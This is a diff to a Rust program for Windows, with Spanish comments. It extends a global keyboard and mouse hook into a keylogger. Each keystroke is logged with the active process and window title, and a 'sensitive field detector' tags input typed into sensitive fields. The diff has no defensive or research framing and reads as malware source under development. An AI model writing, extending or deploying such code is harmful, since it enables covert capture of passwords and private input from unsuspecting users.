@@ -1,3 +1,6 @@
+
+// imports
+
 use std::ptr;
 use std::mem;
 use std::ffi::OsString;
@@ -17,6 +20,7 @@ use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::psapi::GetModuleBaseNameW;
 use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
 
+// windows api functions
 use winapi::um::winuser::{
     CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
     HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
@@ -225,9 +229,12 @@ fn main() {
 
 
 
+// // Variables globales para los hooks
+static mut HOOK: HHOOK = ptr::null_mut(); // Hook global de teclado
+static mut MOUSE_HOOK: HHOOK = ptr::null_mut(); // Hook global de mouse
+use crate::log::{LogEntry, SensitiveFieldDetector}; // Importar el detector de campos sensibles
+static mut FIELD_DETECTOR: Option<SensitiveFieldDetector> = None; // Detector global de campos sensibles
 
-static mut HOOK: HHOOK = ptr::null_mut();
-static mut MOUSE_HOOK: HHOOK = ptr::null_mut();
 
 
 // Callback para teclas
@@ -237,6 +244,7 @@ unsafe extern "system" fn low_level_keyboard_proc(
     l_param: LPARAM,
 ) -> LRESULT {
     if n_code == HC_ACTION as i32 {
+        // si es una tecla presionada...
         if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
             let kb_struct = unsafe { *(l_param as *const KBDLLHOOKSTRUCT) };
             let vk_code = kb_struct.vkCode;
@@ -303,6 +311,22 @@ unsafe extern "system" fn low_level_keyboard_proc(
             // Print con fines de debugging
             println!("Key pressed: {}", key_char);
             // TODO: Aquí llamar a función de logging/encryption
+
+            // Obtener información del proceso activo
+                if let Ok((process_name, window_title)) = check_active_process() {
+                let mut log_entry = LogEntry::new_keystroke(&key_char, &process_name, &window_title);
+                
+                // Verificar si hay campos sensibles en el contexto actual
+                if let Some(ref mut detector) = FIELD_DETECTOR {
+                    if let Ok(sensitive_fields) = detector.scan_active_window() {
+                        if !sensitive_fields.is_empty() {
+                            log_entry = log_entry.with_sensitive_context(sensitive_fields);
+                        }
+                    }
+                }
+                
+                crate::log::write_log(log_entry);
+            }
         }
     }
     
@@ -380,6 +404,7 @@ fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
         
         // Loop de mensajes para mantener ambos hooks activos
         let mut msg: MSG = std::mem::zeroed();
+        // ciclo infinito para procesar eventos
         while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
             // Los hooks procesan automáticamente los eventos
         }
